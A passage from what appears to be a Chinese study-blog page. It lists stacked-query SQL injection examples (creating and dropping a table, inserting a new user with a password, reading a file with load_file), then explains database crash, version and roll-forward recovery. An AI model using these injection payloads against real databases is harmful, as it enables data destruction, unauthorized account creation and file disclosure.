+<pre><code class="language-sql">新建数据表
+	select * from users where id=1;create table test like users;
+	
+删除数据表
+	select * from users where id=1;drop table test;
+	
+修改数据表
+	select * from users where id=1;insert into users(id,username,password) values('100','new','new');
+	
+查询数据表
+	select * from users where id=1;select 1,2,3;
+	
+加载文件
+	select * from users where id=1;select load_file('c:/tmpupbbn.php');
+</code></pre>
+<h2 id="数据库恢复">数据库恢复</h2>
+<p>数据库恢复的三种方式<br>
+数据库可能因为硬件或软件（或两者同时）的故障变得不可用，不同的故障情况需要不同的恢复操作。我们必须决定最适合业务环境的恢复方法。在数据库中恢复有3种类型或方法，即应急（crash）恢复、版本（version）恢复和前滚（rool forward）恢复。</p>
+<p>应急恢复<br>
+应急恢复用于防止数据库处于不一致或不可用状态。数据库执行的事务（也称工作单元）可能被意外中断，若在作为工作单位一部分的所有更改完成和提交之前发生故障，则该数据库就会处于不一致和不可用的状态。这时，需要将该数据库转化为一致和可用的状态。<br>
+为此，需要回滚未完成的事务，并完成当发生崩溃时仍在内存中的已提交事务。如在COMMIT语句之前发生了电源故障，则在下一次重新启动并再次访问该数据库时，需要回滚到执行COMMMIT语句前的状态。回滚语句的顺序与最初执行时的顺序相反。</p>
+<p>版本恢复<br>
+版本恢复指的是使用备份操作期间创建的映象来复原数据库的先前版本。这种恢复是通过使用一个以前建立的数据库备份恢复出一个完整的数据库。一个数据库的备份允许你把数据库恢复至和这个数据库在备份时完全一样的状态。而从备份建立后到日志文件中最后记录的所有工作事务单位将全部丢失。</p>
+<p>前滚恢复<br>
+这种恢复技术是版本恢复的一个扩展，使用完整的数据库备份和日志相结合，可以使一个数据库或者被选择的表空间恢复到某个特定时间点。如果从备份时刻起到发生故障时的所有日志文件都可以获得的话，则可以恢复到日志上涵盖到的任意时间点。前滚恢复需要在配置中被明确激活才能生效。</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://kite-007.github.io/nodejs/">
+                  <h3 class="post-title">
+                    # nodejs
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
